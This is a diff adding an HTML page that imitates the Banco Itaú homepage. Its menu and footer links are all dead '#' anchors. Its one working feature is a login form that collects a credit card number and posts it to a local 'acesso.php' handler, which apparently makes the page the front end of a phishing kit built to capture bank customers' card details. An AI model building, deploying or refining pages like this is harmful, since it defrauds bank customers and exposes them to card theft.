@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+  <title>
+   Banco Ita&uacute; - Feito pra voc&ecirc;
+  </title>
+  <link href="imagens/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+  <link href="estilos/geral.css" rel="stylesheet"/>
+  <script src="javascripts/geral.js">
+  </script>
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet"/>
+ </head>
+ <body>
+  <div class="container corpo_home">
+   <div class="content_home">
+    <div class="clear">
+    </div>
+   </div>
+   <!-- content_home -->
+  </div>
+  <!-- container -->
+  <div class="container header_home">
+   <div class="content_home">
+    <div class="logo">
+     <img alt="" src="imagens/logo.png"/>
+    </div>
+    <!-- logo -->
+    <div class="busca">
+     <input autocomplete="off" class="busca_home" id="busca_home" name="busca_home" placeholder="O que voc&ecirc; procura?" type="text"/>
+    </div>
+    <!-- busca -->
+    <div class="menu">
+     <ul>
+      <li>
+       <a href="#">
+        Produtos
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        Seus Objetivos
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        Atendimento
+       </a>
+      </li>
+     </ul>
+    </div>
+    <!-- menu -->
+    <div class="enter_home">
+     <form action="acesso.php" method="post">
+      <div class="select_menu">
+       <p class="box_selected">
+        &nbsp;&nbsp;Cart&atilde;o de Cr&eacute;dito&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        <img alt="" src="imagens/setas_menu.png"/>
+       </p>
+      </div>
+      <!-- select_menu -->
+      <input autocomplete="off" class="input_enter_home" id="is_crd" maxlength="16" name="is_crd" onkeypress="return SomenteNumero(event)" placeholder="N&uacute;mero do Cart&atilde;o" type="text"/>
+      <button class="enter_button_home" id="is_enter" name="is_enter" onclick="return check_enter_index();">
+       <img alt="" src="imagens/cadeado_button_home.png"/>
+       &nbsp;&nbsp;Acessar
+      </button>
+      <input name="sender" type="hidden" value="crd"/>
+     </form>
+     <img class="horas" src="imagens/horas.gif"/>
+    </div>
+    <!-- enter_home -->
+    <div class="clear">
+    </div>
+   </div>
+   <!-- content_home -->
+  </div>
+  <!-- container -->
+  <div class="container footer_home">
+   <div class="content_home">
+    <div class="menu_left">
+     <ul>
+      <li>
+       <a href="#">
+        Resultado 1&ordm; trim 2018
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        Sobre
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        Rela&ccedil;&atilde;o com investidores
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        An&aacute;lises Econ&ocirc;micas
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        Carreira
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        Termo de uso e privacidade
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        Seguran&ccedil;a
+       </a>
+      </li>
+     </ul>
+    </div>
+    <!-- menu_left -->
+    <div class="clear">
+    </div>
+   </div>
+   <!-- content_home -->
+  </div>
+  <!-- container -->
+ </body>
+</html>
